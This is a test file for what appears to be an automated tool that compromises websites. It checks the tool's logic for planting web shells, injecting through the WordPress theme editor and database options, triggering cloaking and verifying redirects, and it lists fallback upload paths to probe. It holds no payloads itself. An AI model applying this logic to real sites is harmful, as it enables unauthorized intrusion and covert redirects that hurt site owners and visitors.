/**
 * Tests for pipeline bug fixes:
 * 1. Cloaking trigger condition — only real uploads, not shellless
 * 2. Upload path fallbacks — comprehensive paths when vuln scan finds nothing
 * 3. Timeout increases — job-runner 10min, oneclick-sse 8min
 * 4. DeployResult success field (from previous fix)
 */
import { describe, it, expect } from "vitest";

// ─── Test 1: Cloaking should NOT trigger from shellless results ───

describe("Cloaking trigger condition", () => {
  it("should filter out shellless results from real uploads", () => {
    const uploadedFiles = [
      { url: "https://target.com/shell.php", method: "oneClickDeploy", verified: true, redirectWorks: true, httpStatus: 200 },
      { url: "https://target.com", method: "shellless_htaccess", verified: true, redirectWorks: false, httpStatus: 200 },
      { url: "https://target.com", method: "shellless_rest_api", verified: true, redirectWorks: true, httpStatus: 200 },
    ];

    const realUploadedFiles = uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
    const hasRealUploads = realUploadedFiles.length > 0;

    expect(realUploadedFiles).toHaveLength(1);
    expect(realUploadedFiles[0].method).toBe("oneClickDeploy");
    expect(hasRealUploads).toBe(true);
  });

  it("should NOT trigger cloaking when only shellless results exist", () => {
    const uploadedFiles = [
      { url: "https://target.com", method: "shellless_htaccess", verified: true, redirectWorks: false, httpStatus: 200 },
      { url: "https://target.com", method: "shellless_rest_api", verified: true, redirectWorks: true, httpStatus: 200 },
      { url: "https://target.com", method: "shellless_cache_poison", verified: false, redirectWorks: false, httpStatus: 200 },
    ];

    const realUploadedFiles = uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
    const hasRealUploads = realUploadedFiles.length > 0;

    expect(realUploadedFiles).toHaveLength(0);
    expect(hasRealUploads).toBe(false);
  });

  it("should trigger cloaking for wp_admin and wp_db methods (real uploads)", () => {
    const uploadedFiles = [
      { url: "https://target.com/functions.php", method: "wp_admin_theme_editor", verified: true, redirectWorks: true, httpStatus: 200 },
      { url: "https://target.com", method: "wp_db_option_inject", verified: true, redirectWorks: true, httpStatus: 200 },
    ];

    const realUploadedFiles = uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
    const hasRealUploads = realUploadedFiles.length > 0;

    expect(realUploadedFiles).toHaveLength(2);
    expect(hasRealUploads).toBe(true);
  });

  it("should use realUploadedFiles for activeShellUrl, not shellless", () => {
    const uploadedFiles = [
      { url: "https://target.com", method: "shellless_htaccess", verified: true, redirectWorks: false, httpStatus: 200 },
      { url: "https://target.com/shell.php", method: "parallel_put", verified: true, redirectWorks: true, httpStatus: 200 },
    ];

    const realUploadedFiles = uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
    const activeShellUrl = realUploadedFiles.find(f => f.verified)?.url || realUploadedFiles[0]?.url;

    expect(activeShellUrl).toBe("https://target.com/shell.php");
  });
});

// ─── Test 2: Upload path fallbacks ───

describe("Upload path fallbacks", () => {
  it("should use vuln scan paths when available", () => {
    const vulnScan = {
      writablePaths: [
        { path: "/wp-content/uploads/", method: "PUT", verified: true, statusCode: 200, contentType: "", allowsPhp: true },
        { path: "/uploads/", method: "POST", verified: false, statusCode: 200, contentType: "", allowsPhp: false },
      ],
    };

    const scanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
    const uploadPaths = scanPaths || ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/"];

    expect(uploadPaths).toEqual(["/wp-content/uploads/", "/uploads/"]);
  });

  it("should use comprehensive fallback paths when vuln scan has empty writable paths", () => {
    const vulnScan = {
      writablePaths: [] as any[],
    };
    const prescreen = {
      writablePaths: [] as string[],
    };

    const scanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
    const prescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
    const uploadPaths = scanPaths || prescreenPaths || [
      "/wp-content/uploads/", "/uploads/", "/images/", "/tmp/",
      "/wp-content/themes/", "/wp-content/plugins/", "/wp-includes/",
      "/media/", "/assets/", "/cache/", "/files/",
      "/public/uploads/", "/content/images/", "/data/", "/backup/",
    ];

    expect(scanPaths).toBeNull();
    expect(prescreenPaths).toBeNull();
    expect(uploadPaths).toHaveLength(15);
    expect(uploadPaths).toContain("/wp-content/uploads/");
    expect(uploadPaths).toContain("/backup/");
  });

  it("should use prescreen paths when vuln scan is null", () => {
    const vulnScan = null;
    const prescreen = {
      writablePaths: ["/custom/upload/", "/data/files/"],
    };

    const scanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map((w: any) => w.path) : null;
    const prescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
    const uploadPaths = scanPaths || prescreenPaths || ["/wp-content/uploads/"];

    expect(uploadPaths).toEqual(["/custom/upload/", "/data/files/"]);
  });
});

// ─── Test 3: Timeout values ───

describe("Pipeline timeout values", () => {
  it("job-runner should use 10 minute timeout", () => {
    const PIPELINE_TIMEOUT_MS = 10 * 60 * 1000;
    expect(PIPELINE_TIMEOUT_MS).toBe(600000);
    expect(PIPELINE_TIMEOUT_MS / 1000 / 60).toBe(10);
  });

  it("oneclick-sse should use 8 minute timeout", () => {
    const PIPELINE_TIMEOUT_MS = 8 * 60 * 1000;
    expect(PIPELINE_TIMEOUT_MS).toBe(480000);
    expect(PIPELINE_TIMEOUT_MS / 1000 / 60).toBe(8);
  });
});

// ─── Test 4: DeployResult success field ───

describe("DeployResult success field", () => {
  it("should set success=true when redirectActive", () => {
    const summary = { redirectActive: true, totalFilesDeployed: 1, successSteps: 3 };
    const success = summary.redirectActive || summary.totalFilesDeployed > 0;
    expect(success).toBe(true);
  });

  it("should set success=true when files deployed even without redirect", () => {
    const summary = { redirectActive: false, totalFilesDeployed: 2, successSteps: 1 };
    const success = summary.redirectActive || summary.totalFilesDeployed > 0;
    expect(success).toBe(true);
  });

  it("should set success=false when nothing deployed", () => {
    const summary = { redirectActive: false, totalFilesDeployed: 0, successSteps: 0 };
    const success = summary.redirectActive || summary.totalFilesDeployed > 0;
    expect(success).toBe(false);
  });
});

// ─── Test 5: PipelineResult success calculation ───

describe("PipelineResult success calculation", () => {
  it("should be success when redirect works", () => {
    const uploadedFiles = [
      { url: "https://target.com/shell.php", verified: true, redirectWorks: true, httpStatus: 200 },
    ];
    const verifiedFiles = uploadedFiles.filter(f => f.verified);
    const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
    const success = redirectWorkingFiles.length > 0 || verifiedFiles.length > 0;
    expect(success).toBe(true);
  });

  it("should be success when file is verified even without redirect", () => {
    const uploadedFiles = [
      { url: "https://target.com/shell.php", verified: true, redirectWorks: false, httpStatus: 200 },
    ];
    const verifiedFiles = uploadedFiles.filter(f => f.verified);
    const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
    const success = redirectWorkingFiles.length > 0 || verifiedFiles.length > 0;
    expect(success).toBe(true);
  });

  it("should be failed when nothing verified", () => {
    const uploadedFiles: any[] = [];
    const verifiedFiles = uploadedFiles.filter(f => f.verified);
    const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
    const success = redirectWorkingFiles.length > 0 || verifiedFiles.length > 0;
    expect(success).toBe(false);
  });
});
